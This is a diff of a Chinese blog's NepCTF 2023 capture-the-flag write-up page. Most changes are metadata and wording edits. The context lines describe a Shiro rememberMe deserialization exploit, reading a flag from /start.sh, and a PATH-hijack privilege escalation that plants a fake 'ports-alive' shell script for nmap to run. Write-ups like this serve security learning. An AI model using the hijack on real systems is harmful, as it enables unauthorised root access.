@@ -41,7 +41,7 @@
 <meta property="og:image" content="https://zer0peach.github.io/2023/08/31/NepCTF2023/web4.png">
 <meta property="og:image" content="https://zer0peach.github.io/2023/08/31/NepCTF2023/web5.png">
 <meta property="article:published_time" content="2023-08-31T02:30:51.000Z">
-<meta property="article:modified_time" content="2023-08-31T02:46:04.121Z">
+<meta property="article:modified_time" content="2023-08-31T04:34:57.431Z">
 <meta property="article:author" content="Zer0peach">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://zer0peach.github.io/2023/08/31/NepCTF2023/%E9%99%8C%E7%94%9F%E7%9A%84%E7%BA%B8%E6%9D%A1.jpg">
@@ -248,7 +248,7 @@
         
         
         
-          137 分钟
+          138 分钟
         
       </span>
     
@@ -356,7 +356,8 @@
 <p>然后<code>RUN</code></p>
 <p><img src="/2023/08/31/NepCTF2023/image-20230819032625921.png" srcset="/img/loading.gif" lazyload alt="image-20230819032625921"></p>
 <p>这里复现就不比对了</p>
-<h2 id="WEB（参考Boogipop的博客）"><a href="#WEB（参考Boogipop的博客）" class="headerlink" title="WEB（参考Boogipop的博客）"></a>WEB（参考Boogipop的博客）</h2><h3 id="ez-java-checkin"><a href="#ez-java-checkin" class="headerlink" title="ez_java_checkin"></a>ez_java_checkin</h3><p>经典的shrio rememberMe反序列化</p>
+<h2 id="WEB（参考Boogipop的博客和官方WP）"><a href="#WEB（参考Boogipop的博客和官方WP）" class="headerlink" title="WEB（参考Boogipop的博客和官方WP）"></a>WEB（参考Boogipop的博客和官方WP）</h2><p>（没环境复现，都是大佬的图，给的题目附件不会用）</p>
+<h3 id="ez-java-checkin"><a href="#ez-java-checkin" class="headerlink" title="ez_java_checkin"></a>ez_java_checkin</h3><p>经典的shrio rememberMe反序列化</p>
 <p>利用CC2的链去打</p>
 <p>这里用工具一把梭</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#算是非预期</span><br>cat /start.sh<br><br><span class="hljs-comment">#/bin/bash</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">GZCTF_FLAG</span>=NepcTF&#123;Ezjava_Chekin&#125;<br>echo <span class="hljs-variable">$GZCTF_FLAG</span> &gt; /flag<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">GZCTF_FLAG</span>=<span class="hljs-string">&quot;HAHA,NO FLAG but boom.&quot;</span><br>su ctf -c <span class="hljs-string">&quot;bash -c &#x27;java -jar /ShiroSpring-0.0.1-SNAPSHOT.jar&#x27;&quot;</span><br></code></pre></td></tr></table></figure>
@@ -394,10 +395,10 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/sh&quot;</span> &gt; ports-alive   <br><span class="hljs-built_in">chmod</span> 777 ports-alive<br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>nmap 127.0.0.1<br><br></code></pre></td></tr></table></figure>
 
 <p>一定要是<code>ports-alive</code>文件，因为<code>nmap</code>执行时会报错<code>ports-alive：not found</code>（就是这里被坑了）</p>
-<p>nmap会调用<code>ports-alive</code>文件，所以使用环境变量提权</p>
+<p>nmap会调用<code>ports-alive</code>文件</p>
 <h3 id="独步天下-破除虚妄-探见真实"><a href="#独步天下-破除虚妄-探见真实" class="headerlink" title="独步天下-破除虚妄_探见真实"></a>独步天下-破除虚妄_探见真实</h3><p>该类题为内网题目，需要使用内网工具进行内网探测  （这里无环境复现，也没有实际尝试过，也不会尝试，所以探测过程就不写了 ，下次一定）</p>
 <p>运行<code>ports-alive</code>(题目中存在的端口探测脚本)</p>
-<p><code>ports-alive not found</code> 是因为使用的是<code>sh</code>而<code>ports-alive</code>中是<code>#!/bin/bash</code>，把该标注修改为<code>#!/bin/sh</code></p>
+<p><code>ports-alive not found</code> 是因为使用的是<code>sh</code>而<code>ports-alive</code>中是<code>#!/bin/bash</code>，把该标注修改为<code>#!/bin/sh</code> （那上面的nmap就不知道什么原因了）</p>
 <p><code>./ports-alive 192.168.200.1 0 100</code></p>
 <p>发现80和82端口</p>
 <p>打开82端口</p>
@@ -510,6 +511,12 @@
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/" title="php的__wakeup绕过">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">php的__wakeup绕过</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
